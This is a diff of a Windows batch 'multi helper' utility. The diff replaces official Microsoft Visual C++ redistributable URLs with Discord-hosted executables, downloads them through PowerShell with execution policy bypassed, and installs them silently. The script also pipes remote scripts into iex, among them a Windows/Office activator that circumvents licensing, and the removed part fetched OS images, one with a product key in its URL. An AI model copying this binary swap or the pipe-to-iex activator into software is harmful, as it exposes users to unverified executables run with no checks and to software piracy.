@@ -1,14 +1,48 @@
 ��&cls
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAnk
+::fBw5plQjdG8=
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSjk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSTk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+JeA==
+::cxY6rQJ7JhzQF1fEqQJQ
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQJQ
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCyDJGyX8VAjFDhOQQGMJleeA6YX/Ofr0/6CsVkJGucnfe8=
+::YB416Ek+ZW8=
+::
+::
+::978f952a14a936cc963da21a135fa983
 @echo off
 chcp 65001
 mode con cols=130 lines=30
 cls
 SETLOCAL ENABLEEXTENSIONS
 
-set ver=2.1.0
+set ver=2.0.0
 echo %ver% > %localappdata%\MultiTool\version.txt
 
 mkdir %temp%\MultiTool\ >NUL
+
 
 goto check_Permissions
 
@@ -47,7 +81,6 @@ exit
 
 
 :main
-chcp 65001 >NUL
 color 9
 cls
 title Windows Multi Helper %ver%
@@ -66,9 +99,9 @@ echo               ║ [1] Windows Activator (Windows/Office)        [12] ------
 echo               ║ [2] Windows Utilities                         [13] -------------                            ║
 echo               ║ [3] Reinstall Microsoft Store                 [14] -------------                            ║
 echo               ║ [4] Uninstall Microsoft Edge                  [15] -------------                            ║
-echo               ║ [5] Net Booster                               [16] -------------                            ║
-echo               ║ [6] Clear Temp/Prefetch                       [17] -------------                            ║
-echo               ║ [7] Update all APPS                           [18] Install OS ISO                           ║
+echo               ║ [5] Net Booster (Safe)                        [16] -------------                            ║
+echo               ║ [6] Clear Temp/Prefetch (Safe)                [17] -------------                            ║
+echo               ║ [7] Update all APPS                           [18] -------------                            ║
 echo               ║ [8] Install VCRedist 2005-2022                                                              ║
 echo               ║ [9] --------------                                                                          ║
 echo               ║ [10] -------------                                                                          ║
@@ -90,16 +123,11 @@ if '%choice%'=='7' goto 7
 if '%choice%'=='8' goto 8
 
 
-if '%choice%'=='18' goto 18
-
 if '%choice%'=='0' goto 0
 echo "%choice%" is not valid, try again
 echo.
-goto main
+start "" "%~f0"
 exit
-
-
-
 
 
 :0
@@ -111,7 +139,7 @@ echo Autor: Czmenz
 echo.
 echo Enter to back
 PAUSE >NUL
-goto main
+start "" "%~f0"
 exit
 
 
@@ -120,9 +148,8 @@ exit
 echo.
 echo Loading...
 title Activator - Windows Multi Helper %ver%
-chcp 437 >NUL
 powershell.exe "irm https://get.activated.win | iex"
-goto main
+start "" "%~f0"
 exit
 
 
@@ -131,16 +158,14 @@ exit
 echo.
 echo Loading...
 title Utilities - Windows Multi Helper %ver%
-chcp 437 >NUL
 powershell.exe "irm "https://christitus.com/win" | iex"
-goto main
+start "" "%~f0"
 exit
 
 :3
 echo.
 echo Loading...
 title MicrosoftReinstall - Windows Multi Helper %ver%
-chcp 437 >NUL
 powershell.exe "Get-AppXPackage | Foreach {Add-AppxPackage -DisableDevelopmentMode -Register """$($_.InstallLocation)\AppXManifest.xml"""}"
 echo .
 
@@ -156,14 +181,13 @@ echo objShell.Popup WScript.Arguments(0), 5, WScript.Arguments(1), 64 >> temp_no
 cscript //nologo temp_notify.vbs "Restart may be required" "Windows MultiHelper"
 del temp_notify.vbs
 
-goto main
+start "" "%~f0"
 exit
 
 :4
 echo.
 echo Loading...
 title EdgeRemoval - Windows Multi Helper %ver%
-chcp 437 >NUL
 powershell.exe "Get-AppxPackage *MicrosoftEdge* | Remove-AppxPackage"
 echo.
 echo Restart may be needed
@@ -179,14 +203,13 @@ echo Set objShell = CreateObject("WScript.Shell") >> temp_notify.vbs
 echo objShell.Popup WScript.Arguments(0), 5, WScript.Arguments(1), 64 >> temp_notify.vbs
 cscript //nologo temp_notify.vbs "Restart may be required" "Windows MultiHelper"
 del temp_notify.vbs
-goto main
+start "" "%~f0"
 exit
 
 
 :5
 echo.
 echo Loading...
-chcp 437 >NUL
 title NetBooster - Windows Multi Helper %ver%
 
 :: Set DNS, Local, Hosts, and NetBT priority
@@ -243,7 +266,7 @@ echo Set objShell = CreateObject("WScript.Shell") >> temp_notify.vbs
 echo objShell.Popup WScript.Arguments(0), 5, WScript.Arguments(1), 64 >> temp_notify.vbs
 cscript //nologo temp_notify.vbs "Restart needed for apply" "Windows MultiHelper"
 del temp_notify.vbs
-goto main
+start "" "%~f0"
 exit
 
 
@@ -264,7 +287,7 @@ echo Set objShell = CreateObject("WScript.Shell") >> temp_notify.vbs
 echo objShell.Popup WScript.Arguments(0), 5, WScript.Arguments(1), 64 >> temp_notify.vbs
 cscript //nologo temp_notify.vbs "Cleared Temp and Prefetch" "Windows MultiHelper"
 del temp_notify.vbs
-goto main
+start "" "%~f0"
 exit
 
 
@@ -300,7 +323,7 @@ echo.
 echo INSTALLING
 echo ALL Updates Installed
 timeout /t 3>NUL
-goto main
+start "" "%~f0"
 exit
 
 
@@ -347,129 +370,106 @@ goto 8
 :81
 echo.
 echo Downloading 2005
-echo.
-curl --ssl-no-revoke -o "%temp%\MultiTool\2005.exe" "https://download.microsoft.com/download/8/B/4/8B42259F-5D70-43F4-AC2E-4B208FD8D66A/vcredist_x64.EXE"
-echo.
-curl --ssl-no-revoke -o "%temp%\MultiTool\2005x86.exe" "https://download.microsoft.com/download/8/B/4/8B42259F-5D70-43F4-AC2E-4B208FD8D66A/vcredist_x86.EXE"
+powershell -NoProfile -ExecutionPolicy Bypass -c "Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1339296835583348786/1339297182850744430/vcredist2005_x64.exe?ex=67ae3533&is=67ace3b3&hm=53c24fcc2da66432ff3d3f9f7e7c44d6c09a81715daee90c3e521cdd573571e2&' -OutFile '%temp%\MultiTool\2005.exe'"
+powershell -NoProfile -ExecutionPolicy Bypass -c "Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1339296835583348786/1339300312632135691/vcredist2005_x86.exe?ex=67ae381d&is=67ace69d&hm=1b6a1df1cf3dedbb09ef65b5bfaebf390c98fc79f49a0131324be145d7d702e3&' -OutFile '%temp%\MultiTool\2005x86.exe'"
 echo Installing...
 start /wait %temp%\MultiTool\2005.exe /q
 start /wait %temp%\MultiTool\2005x86.exe /q
 del %temp%\MultiTool\2005.exe
 del %temp%\MultiTool\2005x86.exe
-goto 8
+start "" "%~f0"
 exit
 
 :82
 echo.
 echo Downloading 2008
-echo.
-curl --ssl-no-revoke -o "%temp%\MultiTool\2008.exe" "https://download.microsoft.com/download/5/D/8/5D8C65CB-C849-4025-8E95-C3966CAFD8AE/vcredist_x64.exe"
-echo.
-curl --ssl-no-revoke -o "%temp%\MultiTool\2008x86.exe" "https://download.microsoft.com/download/5/D/8/5D8C65CB-C849-4025-8E95-C3966CAFD8AE/vcredist_x86.exe"
+powershell -NoProfile -ExecutionPolicy Bypass -c "Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1339296835583348786/1339301969000530032/vcredist2008_x64.exe?ex=67ae39a8&is=67ace828&hm=529f506d0952cfce02b176400b9288c5e73a8843e2cc398e225f15285d0ab580&' -OutFile '%temp%\MultiTool\2008.exe'"
+powershell -NoProfile -ExecutionPolicy Bypass -c "Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1339296835583348786/1339301978991493131/vcredist2008_x86.exe?ex=67ae39aa&is=67ace82a&hm=b4d681732396d8d1ad06967f5635bb0ea3c0b8f0f4d04b8327f5649a3173e3fa&' -OutFile '%temp%\MultiTool\2008x86.exe'"
 echo Installing...
 start /wait %temp%\MultiTool\2008.exe /q
 start /wait %temp%\MultiTool\2008x86.exe /q
 del %temp%\MultiTool\2008.exe
 del %temp%\MultiTool\2008x86.exe
-goto 8
+start "" "%~f0"
 exit
 
 :83
 echo.
 echo Downloading 2010
-echo.
-curl --ssl-no-revoke -o "%temp%\MultiTool\2010.exe" "https://download.microsoft.com/download/1/6/5/165255E7-1014-4D0A-B094-B6A430A6BFFC/vcredist_x64.exe"
-echo.
-curl --ssl-no-revoke -o "%temp%\MultiTool\2010x86.exe" "https://download.microsoft.com/download/1/6/5/165255E7-1014-4D0A-B094-B6A430A6BFFC/vcredist_x86.exe"
+powershell -NoProfile -ExecutionPolicy Bypass -c "Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1339296835583348786/1339302600411185233/vcredist2010_x64.exe?ex=67ae3a3e&is=67ace8be&hm=c6aa4d23d25d03a48cd4b3bd1fe83dbc8518525e96facf146f9fa46f16c1e60a&' -OutFile '%temp%\MultiTool\2010.exe'"
+powershell -NoProfile -ExecutionPolicy Bypass -c "Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1339296835583348786/1339302570346287186/vcredist2010_x86.exe?ex=67ae3a37&is=67ace8b7&hm=2e2fb99c1d01986cce1d0d394309a4f0e1e60ae3a1176022bfd9e414757b3344&' -OutFile '%temp%\MultiTool\2010x86.exe'"
 echo Installing...
 start /wait %temp%\MultiTool\2010.exe /q
 start /wait %temp%\MultiTool\2010x86.exe /q
 del %temp%\MultiTool\2010.exe
 del %temp%\MultiTool\2010x86.exe
-goto 8
+start "" "%~f0"
 exit
 
 :84
 echo.
 echo Downloading 2012
-echo.
-curl --ssl-no-revoke -o "%temp%\MultiTool\2012.exe" "https://download.microsoft.com/download/1/6/B/16B06F60-3B20-4FF2-B699-5E9B7962F9AE/VSU_4/vcredist_x64.exe"
-echo.
-curl --ssl-no-revoke -o "%temp%\MultiTool\2012x86.exe" "https://download.microsoft.com/download/1/6/B/16B06F60-3B20-4FF2-B699-5E9B7962F9AE/VSU_4/vcredist_x86.exe"
+powershell -NoProfile -ExecutionPolicy Bypass -c "Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1339296835583348786/1339302814270226564/vcredist2012_x64.exe?ex=67ae3a71&is=67ace8f1&hm=37114523c431323bb807eadc4a27dd6a2295ad4ffd0fb25fcfaa0c6ae9cabec3&' -OutFile '%temp%\MultiTool\2012.exe'"
+powershell -NoProfile -ExecutionPolicy Bypass -c "Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1339296835583348786/1339302819928346694/vcredist2012_x86.exe?ex=67ae3a73&is=67ace8f3&hm=18022ca6a2d1b49ba7a582753bc6235b00fe85a568abf29892f9de43feab47bc&' -OutFile '%temp%\MultiTool\2012x86.exe'"
 echo Installing...
 start /wait %temp%\MultiTool\2012.exe /q
 start /wait %temp%\MultiTool\2012x86.exe /q
 del %temp%\MultiTool\2012.exe
 del %temp%\MultiTool\2012x86.exe
-goto 8
+start "" "%~f0"
 exit
 
 :85
 echo.
 echo Downloading 2013
-echo.
-curl --ssl-no-revoke -o "%temp%\MultiTool\2013.exe" "https://download.microsoft.com/download/2/e/6/2e61cfa4-993b-4dd4-91da-3737cd5cd6e3/vcredist_x64.exe"
-echo.
-curl --ssl-no-revoke -o "%temp%\MultiTool\2013x86.exe" "https://download.microsoft.com/download/2/e/6/2e61cfa4-993b-4dd4-91da-3737cd5cd6e3/vcredist_x86.exe"
+powershell -NoProfile -ExecutionPolicy Bypass -c "Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1339296835583348786/1339303258128257055/vcredist2013_x64.exe?ex=67ae3adb&is=67ace95b&hm=bcca7a8c90eb73fcb77c167a8f3dbaf6161e46421fecd18336cff0691889a1d2&' -OutFile '%temp%\MultiTool\2013.exe'"
+powershell -NoProfile -ExecutionPolicy Bypass -c "Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1339296835583348786/1339303262351921162/vcredist2013_x86.exe?ex=67ae3adc&is=67ace95c&hm=ddb3f76e5cda575c35cdabd227bf83c9f79d298b63d2737eff36f32a27a6270c&' -OutFile '%temp%\MultiTool\2013x86.exe'"
 echo Installing...
 start /wait %temp%\MultiTool\2013.exe /q
 start /wait %temp%\MultiTool\2013x86.exe /q
 del %temp%\MultiTool\2013.exe
 del %temp%\MultiTool\2013x86.exe
-goto 8
+start "" "%~f0"
 exit
+
 
 :86
 echo.
 echo Downloading 2015, 2017, 2019 and 2022
-echo.
-curl --ssl-no-revoke -o "%temp%\MultiTool\2015792.exe" "https://download.visualstudio.microsoft.com/download/pr/285b28c7-3cf9-47fb-9be8-01cf5323a8df/8F9FB1B3CFE6E5092CF1225ECD6659DAB7CE50B8BF935CB79BFEDE1F3C895240/VC_redist.x64.exe"
-echo.
-curl --ssl-no-revoke -o "%temp%\MultiTool\2015792x86.exe" "https://download.visualstudio.microsoft.com/download/pr/285b28c7-3cf9-47fb-9be8-01cf5323a8df/C4E3992F3883005881CF3937F9E33F1C7D792AC1C860EA9C52D8F120A16A7EB1/VC_redist.x86.exe"
+powershell -NoProfile -ExecutionPolicy Bypass -c "Invoke-WebRequest -Uri 'https://aka.ms/vs/17/release/vc_redist.x64.exe' -OutFile '%temp%\MultiTool\2015792.exe'"
+powershell -NoProfile -ExecutionPolicy Bypass -c "Invoke-WebRequest -Uri 'https://aka.ms/vs/17/release/vc_redist.x64.exe' -OutFile '%temp%\MultiTool\2015792x86.exe'"
 echo Installing...
 start /wait %temp%\MultiTool\2015792.exe /q
 start /wait %temp%\MultiTool\2015792x86.exe /q
 del %temp%\MultiTool\2015792.exe
 del %temp%\MultiTool\2015792x86.exe
-goto 8
+start "" "%~f0"
 exit
 
 :8A
 echo Downloading 2015, 2017, 2019 and 2022
-echo.
-curl -o "%temp%\MultiTool\2015792.exe" "https://download.visualstudio.microsoft.com/download/pr/285b28c7-3cf9-47fb-9be8-01cf5323a8df/C4E3992F3883005881CF3937F9E33F1C7D792AC1C860EA9C52D8F120A16A7EB1/VC_redist.x86.exe"
-echo.
-curl --ssl-no-revoke -o "%temp%\MultiTool\2015792x86.exe" "https://download.visualstudio.microsoft.com/download/pr/285b28c7-3cf9-47fb-9be8-01cf5323a8df/C4E3992F3883005881CF3937F9E33F1C7D792AC1C860EA9C52D8F120A16A7EB1/VC_redist.x86.exe"
+powershell -NoProfile -ExecutionPolicy Bypass -c "Invoke-WebRequest -Uri 'https://aka.ms/vs/17/release/vc_redist.x64.exe' -OutFile '%temp%\MultiTool\2015792.exe'"
+powershell -NoProfile -ExecutionPolicy Bypass -c "Invoke-WebRequest -Uri 'https://aka.ms/vs/17/release/vc_redist.x64.exe' -OutFile '%temp%\MultiTool\2015792x86.exe'"
 
 echo Downloading 2013
-echo.
-curl --ssl-no-revoke -o "%temp%\MultiTool\2013.exe" "https://download.microsoft.com/download/2/e/6/2e61cfa4-993b-4dd4-91da-3737cd5cd6e3/vcredist_x64.exe"
-echo.
-curl --ssl-no-revoke -o "%temp%\MultiTool\2013x86.exe" "https://download.microsoft.com/download/2/e/6/2e61cfa4-993b-4dd4-91da-3737cd5cd6e3/vcredist_x86.exe"
+powershell -NoProfile -ExecutionPolicy Bypass -c "Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1339296835583348786/1339303258128257055/vcredist2013_x64.exe?ex=67ae3adb&is=67ace95b&hm=bcca7a8c90eb73fcb77c167a8f3dbaf6161e46421fecd18336cff0691889a1d2&' -OutFile '%temp%\MultiTool\2013.exe'"
+powershell -NoProfile -ExecutionPolicy Bypass -c "Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1339296835583348786/1339303262351921162/vcredist2013_x86.exe?ex=67ae3adc&is=67ace95c&hm=ddb3f76e5cda575c35cdabd227bf83c9f79d298b63d2737eff36f32a27a6270c&' -OutFile '%temp%\MultiTool\2013x86.exe'"
 
 echo Downloading 2012
-echo.
-curl --ssl-no-revoke -o "%temp%\MultiTool\2012.exe" "https://download.microsoft.com/download/1/6/B/16B06F60-3B20-4FF2-B699-5E9B7962F9AE/VSU_4/vcredist_x64.exe"
-echo.
-curl --ssl-no-revoke -o "%temp%\MultiTool\2012x86.exe" "https://download.microsoft.com/download/1/6/B/16B06F60-3B20-4FF2-B699-5E9B7962F9AE/VSU_4/vcredist_x86.exe"
+powershell -NoProfile -ExecutionPolicy Bypass -c "Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1339296835583348786/1339302814270226564/vcredist2012_x64.exe?ex=67ae3a71&is=67ace8f1&hm=37114523c431323bb807eadc4a27dd6a2295ad4ffd0fb25fcfaa0c6ae9cabec3&' -OutFile '%temp%\MultiTool\2012.exe'"
+powershell -NoProfile -ExecutionPolicy Bypass -c "Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1339296835583348786/1339302819928346694/vcredist2012_x86.exe?ex=67ae3a73&is=67ace8f3&hm=18022ca6a2d1b49ba7a582753bc6235b00fe85a568abf29892f9de43feab47bc&' -OutFile '%temp%\MultiTool\2012x86.exe'"
 
 echo Downloading 2010
-echo.
-curl --ssl-no-revoke -o "%temp%\MultiTool\2010.exe" "https://download.microsoft.com/download/1/6/5/165255E7-1014-4D0A-B094-B6A430A6BFFC/vcredist_x64.exe"
-echo.
-curl --ssl-no-revoke -o "%temp%\MultiTool\2010x86.exe" "https://download.microsoft.com/download/1/6/5/165255E7-1014-4D0A-B094-B6A430A6BFFC/vcredist_x86.exe"
+powershell -NoProfile -ExecutionPolicy Bypass -c "Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1339296835583348786/1339302600411185233/vcredist2010_x64.exe?ex=67ae3a3e&is=67ace8be&hm=c6aa4d23d25d03a48cd4b3bd1fe83dbc8518525e96facf146f9fa46f16c1e60a&' -OutFile '%temp%\MultiTool\2010.exe'"
+powershell -NoProfile -ExecutionPolicy Bypass -c "Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1339296835583348786/1339302570346287186/vcredist2010_x86.exe?ex=67ae3a37&is=67ace8b7&hm=2e2fb99c1d01986cce1d0d394309a4f0e1e60ae3a1176022bfd9e414757b3344&' -OutFile '%temp%\MultiTool\2010x86.exe'"
 
 echo Downloading 2008
-echo.
-curl --ssl-no-revoke -o "%temp%\MultiTool\2008.exe" "https://download.microsoft.com/download/5/D/8/5D8C65CB-C849-4025-8E95-C3966CAFD8AE/vcredist_x64.exe"
-echo.
-curl --ssl-no-revoke -o "%temp%\MultiTool\2008x86.exe" "https://download.microsoft.com/download/5/D/8/5D8C65CB-C849-4025-8E95-C3966CAFD8AE/vcredist_x86.exe"
+powershell -NoProfile -ExecutionPolicy Bypass -c "Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1339296835583348786/1339301969000530032/vcredist2008_x64.exe?ex=67ae39a8&is=67ace828&hm=529f506d0952cfce02b176400b9288c5e73a8843e2cc398e225f15285d0ab580&' -OutFile '%temp%\MultiTool\2008.exe'"
+powershell -NoProfile -ExecutionPolicy Bypass -c "Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1339296835583348786/1339301978991493131/vcredist2008_x86.exe?ex=67ae39aa&is=67ace82a&hm=b4d681732396d8d1ad06967f5635bb0ea3c0b8f0f4d04b8327f5649a3173e3fa&' -OutFile '%temp%\MultiTool\2008x86.exe'"
 
 echo Downloading 2005
-echo.
-curl --ssl-no-revoke -o "%temp%\MultiTool\2005.exe" "https://download.microsoft.com/download/8/B/4/8B42259F-5D70-43F4-AC2E-4B208FD8D66A/vcredist_x64.EXE"
-echo.
-curl --ssl-no-revoke -o "%temp%\MultiTool\2005x86.exe" "https://download.microsoft.com/download/8/B/4/8B42259F-5D70-43F4-AC2E-4B208FD8D66A/vcredist_x86.EXE"
+powershell -NoProfile -ExecutionPolicy Bypass -c "Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1339296835583348786/1339297182850744430/vcredist2005_x64.exe?ex=67ae3533&is=67ace3b3&hm=53c24fcc2da66432ff3d3f9f7e7c44d6c09a81715daee90c3e521cdd573571e2&' -OutFile '%temp%\MultiTool\2005.exe'"
+powershell -NoProfile -ExecutionPolicy Bypass -c "Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1339296835583348786/1339300312632135691/vcredist2005_x86.exe?ex=67ae381d&is=67ace69d&hm=1b6a1df1cf3dedbb09ef65b5bfaebf390c98fc79f49a0131324be145d7d702e3&' -OutFile '%temp%\MultiTool\2005x86.exe'"
 
 echo Installing...
 start /wait %temp%\MultiTool\2015792.exe /q
@@ -495,6 +495,7 @@ echo Installing...
 start /wait %temp%\MultiTool\2005.exe /q
 start /wait %temp%\MultiTool\2005x86.exe /q
 
+
 del %temp%\MultiTool\2015792.exe
 del %temp%\MultiTool\2015792x86.exe
 
@@ -513,570 +514,5 @@ del %temp%\MultiTool\2008x86.exe
 del %temp%\MultiTool\2005.exe
 del %temp%\MultiTool\2005x86.exe
 
-goto main
+start "" "%~f0"
 exit
-
-
-:18sel
-setlocal
-
-set "psCommand="(new-object -COM 'Shell.Application')^
-.BrowseForFolder(0,'Please choose a folder.',0,0).self.path""
-
-chcp 437 >NUL
-for /f "usebackq delims=" %%I in (`powershell %psCommand%`) do set "folder=%%I"
-
-setlocal enabledelayedexpansion
-REM echo You chose !folder!
-
-endlocal
-
-
-
-:18
-title Operating Systems - Windows Multi Helper %ver%
-echo.
-cls
-echo                    ██████╗  ██████╗ ██╗    ██╗███╗   ██╗██╗      ██████╗  █████╗ ██████╗      ██████╗ ███████╗
-echo                    ██╔══██╗██╔═══██╗██║    ██║████╗  ██║██║     ██╔═══██╗██╔══██╗██╔══██╗    ██╔═══██╗██╔════╝
-echo                    ██║  ██║██║   ██║██║ █╗ ██║██╔██╗ ██║██║     ██║   ██║███████║██║  ██║    ██║   ██║███████╗
-echo                    ██║  ██║██║   ██║██║███╗██║██║╚██╗██║██║     ██║   ██║██╔══██║██║  ██║    ██║   ██║╚════██║
-echo                    ██████╔╝╚██████╔╝╚███╔███╔╝██║ ╚████║███████╗╚██████╔╝██║  ██║██████╔╝    ╚██████╔╝███████║
-echo                    ╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝      ╚═════╝ ╚══════╝
-
-echo.
-echo                     ╔═════════ WINDOWS ═════════╗ ╔═════════= LINUX ══════════╗ ╔═════════ MAC OS ══════════╗
-echo                     ║ [1]. Windows 11  (5GB)    ║ ║ [7]. Ubuntu      (5GB)    ║ ║ [13]. BigSur     (13GB)   ║
-echo                     ║ [2]. Windows 10  (5GB)    ║ ║ [8]. Fedora      (4GB)    ║ ║ [14]. Catalina   (8GB)    ║
-echo                     ║ [3]. Windows 8.1 (3GB)    ║ ║ [9]. Pop!_OS     (4GB)    ║ ║ [15]. HighSierra (6GB)    ║
-echo                     ║ [4]. Windows 7   (5GB)    ║ ║ [10]. Debian     (5GB)    ║ ║ [16]. Mojave     (6GB)    ║
-echo                     ║ [5]. Windows XP  (600MB)  ║ ║ [11]. Arch Linux (1GB)    ║ ║ [17]. Monterey   (14GB)   ║
-echo                     ║ [6]. Windows ME  (400MB)  ║ ║ [12]. Linux Mint (3GB)    ║ ║ [18]. Ventura    (16GB)   ║
-echo                     ╚═══════════════════════════╝ ╚═══════════════════════════╝ ╚═══════════════════════════╝
-
-echo                     ╔══════════════════════════════════════=════════════════════════════════════════════════╗
-echo                     ║     These are not all Operating systems in world. They are just the most popular.     ║
-echo                     ╚═══════════════════════════════════════════════════════════════════════════════════════╝
-echo.
-echo                                                    ╔════════════════════════╗
-echo                                                    ║     [0]. Main Menu     ║
-echo                                                    ╚════════════════════════╝
-
-set choice=
-set /p choice=~multi_helper~ 
-if '%choice%'=='1' goto 181
-if '%choice%'=='2' goto 182
-if '%choice%'=='3' goto 183
-if '%choice%'=='4' goto 184
-if '%choice%'=='5' goto 185
-if '%choice%'=='6' goto 186
-
-if '%choice%'=='7' goto 187
-if '%choice%'=='8' goto 188
-if '%choice%'=='9' goto 189
-if '%choice%'=='10' goto 1810
-if '%choice%'=='11' goto 1811
-if '%choice%'=='12' goto 1812
-
-if '%choice%'=='13' goto 1813
-if '%choice%'=='14' goto 1814
-if '%choice%'=='15' goto 1815
-if '%choice%'=='16' goto 1816
-if '%choice%'=='17' goto 1817
-if '%choice%'=='18' goto 1818
-
-if '%choice%'=='0' goto main
-goto 18
-
-
-
-
-
-REM ================================ WINDOWS ==================================
-REM ================================ WINDOWS ==================================
-REM ================================ WINDOWS ==================================
-
-
-
-:181
-setlocal
-
-set "psCommand="(new-object -COM 'Shell.Application')^
-.BrowseForFolder(0,'Please choose a folder.',0,0).self.path""
-
-chcp 437 >NUL
-for /f "usebackq delims=" %%I in (`powershell %psCommand%`) do set "folder=%%I"
-
-setlocal enabledelayedexpansion
-
-endlocal
-
-echo.
-curl --ssl-no-revoke -o %temp%\MultiTool\Windows11.iso https://archive.org/download/windows11_20220930/Win11_22H2_English_x64v1.iso
-
-move %temp%\MultiTool\Windows11.iso %folder%\Windows11.iso
-
-echo.
-echo Windows 11 ISO Downloaded to %folder%
-pause
-goto main
-
-
-:182
-setlocal
-
-set "psCommand="(new-object -COM 'Shell.Application')^
-.BrowseForFolder(0,'Please choose a folder.',0,0).self.path""
-
-chcp 437 >NUL
-for /f "usebackq delims=" %%I in (`powershell %psCommand%`) do set "folder=%%I"
-
-setlocal enabledelayedexpansion
-
-endlocal
-
-echo.
-curl --ssl-no-revoke -o %temp%\MultiTool\Fedora.iso https://archive.org/download/en-us_windows_10_consumer_editions_version_22h2_updated_feb_2023_x64_dvd_c29e4bb3/en-us_windows_10_consumer_editions_version_22h2_updated_feb_2023_x64_dvd_c29e4bb3.iso
-
-move %temp%\MultiTool\Windows10.iso %folder%\Windows10.iso
-
-echo.
-echo Windows 10 ISO Downloaded to %folder%
-pause
-goto main
-
-
-:183
-setlocal
-
-set "psCommand="(new-object -COM 'Shell.Application')^
-.BrowseForFolder(0,'Please choose a folder.',0,0).self.path""
-
-chcp 437 >NUL
-for /f "usebackq delims=" %%I in (`powershell %psCommand%`) do set "folder=%%I"
-
-setlocal enabledelayedexpansion
-
-endlocal
-
-echo.
-curl --ssl-no-revoke -o %temp%\MultiTool\Windows81.iso https://archive.org/download/win-8.1-english-x-64_20211019/Win8.1_English_x64.iso
-
-move %temp%\MultiTool\Windows81.iso %folder%\Windows81.iso
-
-echo.
-echo Windows 8.1 ISO Downloaded to %folder%
-pause
-goto main
-
-
-:184
-setlocal
-
-set "psCommand="(new-object -COM 'Shell.Application')^
-.BrowseForFolder(0,'Please choose a folder.',0,0).self.path""
-
-chcp 437 >NUL
-for /f "usebackq delims=" %%I in (`powershell %psCommand%`) do set "folder=%%I"
-
-setlocal enabledelayedexpansion
-
-endlocal
-
-echo.
-curl --ssl-no-revoke -o %temp%\MultiTool\Windows7.iso https://archive.org/download/Windows7-iso/win7_64_bit.iso
-
-move %temp%\MultiTool\Windows7.iso %folder%\Windows7.iso
-
-echo.
-echo Windows 7 ISO Downloaded to %folder%
-pause
-goto main
-
-
-:185
-setlocal
-
-set "psCommand="(new-object -COM 'Shell.Application')^
-.BrowseForFolder(0,'Please choose a folder.',0,0).self.path""
-
-chcp 437 >NUL
-for /f "usebackq delims=" %%I in (`powershell %psCommand%`) do set "folder=%%I"
-
-setlocal enabledelayedexpansion
-
-endlocal
-
-echo.
-curl --ssl-no-revoke -o %temp%\MultiTool\WindowsXP.iso https://dn720700.ca.archive.org/0/items/WindowsXPProfessional64BitCorporateEdition/Windows%20XP%20Professional%2064-bit%20Corporate%20Edition%28CD%20Key%20VCFQD-V9FX9-46WVH-K3CD4-4J3JM%29.iso
-
-move %temp%\MultiTool\WindowsXP.iso %folder%\WindowsXP.iso
-
-echo.
-echo Windows XP ISO Downloaded to %folder%
-pause
-goto main
-
-
-:186
-setlocal
-
-set "psCommand="(new-object -COM 'Shell.Application')^
-.BrowseForFolder(0,'Please choose a folder.',0,0).self.path""
-
-chcp 437 >NUL
-for /f "usebackq delims=" %%I in (`powershell %psCommand%`) do set "folder=%%I"
-
-setlocal enabledelayedexpansion
-
-endlocal
-
-echo.
-curl --ssl-no-revoke -o %temp%\MultiTool\WindowsME.iso https://dl-alt1.winworldpc.com/Microsoft%20Windows%20ME%20(4.90.3000)%20(OEM%20Full).7z
-
-move %temp%\MultiTool\WindowsME.iso %folder%\WindowsME.iso
-
-echo.
-echo Windows ME ISO Downloaded to %folder%
-pause
-goto main
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-REM ================================ LINUX ====================================
-REM ================================ LINUX ====================================
-REM ================================ LINUX ====================================
-
-
-:187
-setlocal
-
-set "psCommand="(new-object -COM 'Shell.Application')^
-.BrowseForFolder(0,'Please choose a folder.',0,0).self.path""
-
-chcp 437 >NUL
-for /f "usebackq delims=" %%I in (`powershell %psCommand%`) do set "folder=%%I"
-
-setlocal enabledelayedexpansion
-
-endlocal
-
-echo.
-curl --ssl-no-revoke -o %temp%\MultiTool\Ubuntu.iso https://cz.releases.ubuntu.com/24.10/ubuntu-24.10-desktop-amd64.iso
-
-move %temp%\MultiTool\Ubuntu.iso %folder%\Ubuntu.iso
-
-echo.
-echo Ubuntu ISO Downloaded to %folder%
-pause
-goto main
-
-
-:188
-setlocal
-
-set "psCommand="(new-object -COM 'Shell.Application')^
